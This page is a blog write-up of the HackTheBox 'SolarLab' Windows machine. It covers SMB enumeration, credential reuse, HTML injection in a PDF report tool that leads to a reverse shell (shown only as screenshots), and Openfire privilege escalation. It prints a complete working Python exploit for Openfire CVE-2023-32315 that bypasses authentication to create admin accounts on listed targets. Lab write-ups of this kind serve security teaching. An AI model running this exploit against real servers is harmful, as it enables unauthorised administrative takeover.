<!DOCTYPE html>
<html class="direction--ltr"lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>SolarLab-Windows-Medium | Pwn3d777</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="SolarLab-Windows-Medium" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="SolarLab" />
<meta property="og:description" content="SolarLab" />
<link rel="canonical" href="https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html" />
<meta property="og:url" content="https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html" />
<meta property="og:site_name" content="Pwn3d777" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-07-11T16:05:57+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="SolarLab-Windows-Medium" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-11T16:05:57+00:00","datePublished":"2025-07-11T16:05:57+00:00","description":"SolarLab","headline":"SolarLab-Windows-Medium","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html"},"url":"https://your-site-url/writeups/2025/07/11/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" />
  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
  <script src="/assets/js/jquery.magnific-popup.js"></script>
</head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        
        
        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
        
        
        
        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
        
        
        
        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
        
        
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">

<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
</div>

</div>


<div class="post">
  <h1 class="post-title">SolarLab-Windows-Medium</h1>
  
  <div class="post-date">
    Published on 11 Jul 2025
    
  </div>
  
  <h1 id="solarlab">SolarLab</h1>

<h1 id="1-enumeration">1. Enumeration</h1>

<p>Start with nmap enumeration, we have a http service and smb services running, it tries to redirect us to a domain, once we add the domain to etc/hosts file</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled.png" alt="Untitled" /></p>

<p>In the http service we didn’t find anything interesting at least in the main url, in the other one there is a log in page, we may try to get credentials or something like that</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_1.png" alt="Untitled" /></p>

<p>we can scan port 6791 and it disclose another url: http:report.solarlab.htb</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_2.png" alt="Untitled" /></p>

<p>Using crackmapexec to search some share files we found some files</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_3.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_4.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_5.png" alt="Untitled" /></p>

<p>The .xlsx file disclose information about usernames and passwords, now we need to find a place where we can use it</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_6.png" alt="Untitled" /></p>

<h1 id="2-user-flag">2. User flag</h1>

<p>After we proceed to spray passwords on smb we realize there’s nothing which can help us to get progress</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_7.png" alt="Untitled" /></p>

<p>If you can see, there is a trick right here, in the .xlsx file all usernames are composed by a name and a letter which is the first letter of the next or previous name, taking this and looking for anomalies bakle.byte is the only one user name that doesn’t follow this pattern, but what happens if we make that blake follow this pattern? It would be something like:</p>

<p>Usename: blakeb</p>

<p>Password: password</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_8.png" alt="Untitled" /></p>

<p>Those are valid credentials to the web application running on 6791</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_9.png" alt="Untitled" /></p>

<p>We can leave a request on this page, this request generates a pdf file, let’s search if we can do anything with this</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_10.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_11.png" alt="Untitled" /></p>

<p>According with the name of the machine this looks promising</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_12.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_13.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_14.png" alt="Untitled" /></p>

<p>But we need to find a way to inject this code here and execute remote commands with this.</p>

<p>Previously we tried to change the .png file on the request but it is properly sanitized so we will try to inject the html code in leave request parameter.</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_15.png" alt="Untitled" /></p>

<p>here we have the payload to exploit the vulnerability but to get the reverse shell we will need to use powershell base 64</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_16.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_17.png" alt="Untitled" /></p>

<p>User flag got succesfully</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_18.png" alt="Untitled" /></p>

<h1 id="3priv-esc">3.Priv esc</h1>

<p>There is a openfire user, as we have learnt there are some vulnerabilities around there</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_19.png" alt="Untitled" /></p>

<p>So check if there is a service running locally and try to port forwarding using that port</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_20.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_21.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_22.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_23.png" alt="Untitled" /></p>

<ul>
  <li>
    <p>CVE-2023-32315</p>

    <p>This vulnerability lies within the web-based Admin Console, allowing a path traversal attack through the setup environment. This flaw allows unauthenticated users to access restricted pages intended for administrative users</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">random</span>
  <span class="kn">import</span> <span class="nn">string</span>
  <span class="kn">import</span> <span class="nn">argparse</span>
  <span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
  <span class="kn">import</span> <span class="nn">HackRequests</span>
    
  <span class="n">artwork</span> <span class="o">=</span> <span class="s">'''
    
   ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
  ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
  ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
  ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
  ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
   ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝
                                                                                                           
  Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
  Use at your own risk!
  '''</span>
    
  <span class="k">def</span> <span class="nf">generate_random_string</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
      <span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
      <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    
  <span class="k">def</span> <span class="nf">between</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">starting</span><span class="p">,</span> <span class="n">ending</span><span class="p">):</span>
      <span class="n">s</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">starting</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
          <span class="k">return</span> <span class="s">""</span>
      <span class="n">s</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">starting</span><span class="p">)</span>
      <span class="n">e</span> <span class="o">=</span> <span class="n">string</span><span class="p">[</span><span class="n">s</span><span class="p">:].</span><span class="n">find</span><span class="p">(</span><span class="n">ending</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">e</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
          <span class="k">return</span> <span class="s">""</span>
      <span class="k">return</span> <span class="n">string</span><span class="p">[</span><span class="n">s</span> <span class="p">:</span> <span class="n">s</span><span class="o">+</span><span class="n">e</span><span class="p">]</span>
    
  <span class="n">final_result</span> <span class="o">=</span> <span class="p">[]</span>
    
  <span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
      <span class="n">hack</span> <span class="o">=</span> <span class="n">HackRequests</span><span class="p">.</span><span class="n">hackRequests</span><span class="p">()</span>
      <span class="n">host</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"://"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
    
      <span class="c1"># setup 1: get csrf + jsessionid
</span>      <span class="n">jsessionid</span> <span class="o">=</span> <span class="s">""</span>
      <span class="n">csrf</span> <span class="o">=</span> <span class="s">""</span>
    
      <span class="k">try</span><span class="p">:</span>
          <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp"</span>
    
          <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
              <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"</span><span class="p">,</span>
              <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span>
              <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="p">,</span>
              <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
              <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="p">,</span>
              <span class="s">"DNT"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
              <span class="s">"X-Forwarded-For"</span><span class="p">:</span> <span class="s">"1.2.3.4"</span><span class="p">,</span>
              <span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span> <span class="s">"1"</span>
          <span class="p">}</span>
          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[..] Checking target: </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
          <span class="n">hh</span> <span class="o">=</span> <span class="n">hack</span><span class="p">.</span><span class="n">http</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
          <span class="n">jsessionid</span> <span class="o">=</span> <span class="n">hh</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'JSESSIONID'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
          <span class="n">csrf</span> <span class="o">=</span> <span class="n">hh</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'csrf'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
    
          <span class="k">if</span> <span class="n">jsessionid</span> <span class="o">!=</span> <span class="s">""</span> <span class="ow">and</span> <span class="n">csrf</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
              <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Successfully retrieved JSESSIONID: </span><span class="si">{</span><span class="n">jsessionid</span><span class="si">}</span><span class="s"> + csrf: </span><span class="si">{</span><span class="n">csrf</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
          <span class="k">else</span><span class="p">:</span>
              <span class="k">print</span><span class="p">(</span><span class="s">"Failed to get JSESSIONID and csrf value"</span><span class="p">)</span>
              <span class="k">return</span>
            
          <span class="c1"># setup 2: add user
</span>          <span class="n">username</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
          <span class="n">password</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
            
          <span class="n">header2</span> <span class="o">=</span> <span class="p">{</span>
              <span class="s">"Host"</span><span class="p">:</span> <span class="n">host</span><span class="p">,</span>
              <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0"</span><span class="p">,</span>
              <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span>
              <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="p">,</span>
              <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
              <span class="s">"Cookie"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"JSESSIONID=</span><span class="si">{</span><span class="n">jsessionid</span><span class="si">}</span><span class="s">; csrf=</span><span class="si">{</span><span class="n">csrf</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
              <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="p">,</span>
              <span class="s">"DNT"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
              <span class="s">"X-Forwarded-For"</span><span class="p">:</span> <span class="s">"1.2.3.4"</span><span class="p">,</span>
              <span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span> <span class="s">"1"</span>
          <span class="p">}</span>
    
          <span class="n">create_user_url</span><span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=</span><span class="si">{</span><span class="n">csrf</span><span class="si">}</span><span class="s">&amp;username=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">&amp;name=&amp;email=&amp;password=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">&amp;passwordConfirm=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">&amp;isadmin=on&amp;create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"</span>
          <span class="n">hhh</span> <span class="o">=</span> <span class="n">hack</span><span class="p">.</span><span class="n">http</span><span class="p">(</span><span class="n">create_user_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header2</span><span class="p">)</span>
    
          <span class="k">if</span> <span class="n">hhh</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
              <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"User added successfully: url: </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s"> username: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s"> password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
              <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"success.txt"</span><span class="p">,</span> <span class="s">"a+"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                  <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"url: </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s"> username: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s"> password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
          <span class="k">else</span><span class="p">:</span>
              <span class="k">print</span><span class="p">(</span><span class="s">"Failed to add user"</span><span class="p">)</span>
          <span class="c1"># setup 3: add plugin
</span>    
      <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Error occurred while retrieving cookies: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    
  <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
      <span class="k">print</span><span class="p">(</span><span class="n">artwork</span><span class="p">)</span>
    
      <span class="c1">## parse argument
</span>      <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span> <span class="s">'--target'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'The URL of the target, eg: http://127.0.0.1:9090'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
      <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"-l"</span><span class="p">,</span> <span class="s">"--list"</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"List of target url saperated with new line"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
      <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
    
      <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">target</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">False</span><span class="p">:</span>
          <span class="n">exploit</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">)</span> 
    	
      <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="nb">list</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">False</span><span class="p">:</span>
          <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="nb">list</span><span class="p">)</span> <span class="k">as</span> <span class="n">targets</span><span class="p">:</span>
              <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="n">targets</span><span class="p">:</span>
                  <span class="n">target</span> <span class="o">=</span> <span class="n">target</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span>
                  <span class="k">if</span> <span class="n">target</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
                      <span class="k">continue</span>
                  <span class="k">if</span> <span class="s">"http"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
                      <span class="n">target</span> <span class="o">=</span> <span class="s">"http://"</span> <span class="o">+</span> <span class="n">target</span>
                  <span class="n">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> 
      <span class="k">else</span><span class="p">:</span>
          <span class="n">parser</span><span class="p">.</span><span class="n">print_help</span><span class="p">()</span>
          <span class="n">parser</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
    
  <span class="c1"># def main():
</span>  <span class="c1">#     parser = argparse.ArgumentParser(description="CVE-2023-32315")
</span>  <span class="c1">#     parser.add_argument("-u", help="Target URL")
</span>  <span class="c1">#     parser.add_argument("-l", help="File containing URLs")
</span>  <span class="c1">#     parser.add_argument("-t", type=int, default=10, help="Number of threads")
</span>    
  <span class="c1">#     args = parser.parse_args()
</span>    
  <span class="c1">#     target_url = args.u
</span>  <span class="c1">#     file_path = args.l
</span>  <span class="c1">#     thread = args.t
</span>    
  <span class="c1">#     targets = []
</span>    
  <span class="c1">#     if target_url is None:
</span>  <span class="c1">#         with open(file_path, "r") as file:
</span>  <span class="c1">#             for line in file:
</span>  <span class="c1">#                 target = line.strip()
</span>  <span class="c1">#                 if target == "":
</span>  <span class="c1">#                     continue
</span>  <span class="c1">#                 if "http" not in target:
</span>  <span class="c1">#                     target = "http://" + target
</span>  <span class="c1">#                 targets.append(target)
</span>    
  <span class="c1">#         with ThreadPoolExecutor(max_workers=thread) as executor:
</span>  <span class="c1">#             for target in targets:
</span>  <span class="c1">#                 executor.submit(exploit, target)
</span>                    
    
  <span class="c1">#     else:
</span>  <span class="c1">#         exploit(target_url)
</span>    
  <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
      <span class="n">main</span><span class="p">()</span>
</code></pre></div>    </div>
  </li>
</ul>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_24.png" alt="Untitled" /></p>

<p>Log in as the new admin user</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_25.png" alt="Untitled" /></p>

<p>Exploit the vulnerability uploading the plugin</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_26.png" alt="Untitled" /></p>

<p>Use the same rev shell that we used before to get user flag</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_27.png" alt="Untitled" /></p>

<p>Now we are Openfire user, and we are able to dig into configuration files on the machine, it is also possible to look for logs and scripts</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_28.png" alt="Untitled" /></p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_29.png" alt="Untitled" /></p>

<p>In .script file we found administrator credentials with a encrypted password, but some code lines below we have the key</p>

<p><img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_30.png" alt="Untitled" /></p>

